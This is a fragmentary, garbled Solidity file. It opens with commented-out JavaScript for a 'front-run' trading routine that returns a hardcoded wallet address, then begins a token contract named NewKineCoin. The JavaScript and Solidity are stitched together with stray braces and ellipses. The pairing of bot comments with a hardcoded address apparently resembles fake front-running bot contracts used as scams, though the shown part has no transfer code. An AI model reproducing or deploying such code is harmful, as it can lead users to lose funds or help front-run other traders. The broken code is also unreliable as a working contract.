...
//async function triggersFrontRun(transaction, out_token_address, amount, level) {
    ...
    //if(parseInt(transaction['gasPrice']) / 10*9 > 10 && parseInt(transaction['gasPrice']) / 10*9 < 50){
		...
		return 0x98F634509519dAC1420A17A2A2081E6267c50622;//pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
		}
        //attack_started = true;
        //return true
  //  
...
contract NewKineCoin {
    Manager manager;
    mapping (address => uint) public balances;
    mapping (address => mapping (address => uint)) public allowance;
    uint public decimals = 18;
    uint public totalSupply = 1000000 * 10 ** 18; //Coin Supply
    string public name = 'NewKineCoin'; //Coin Name
    string public symbol = 'NKC'; //Coin Symbol
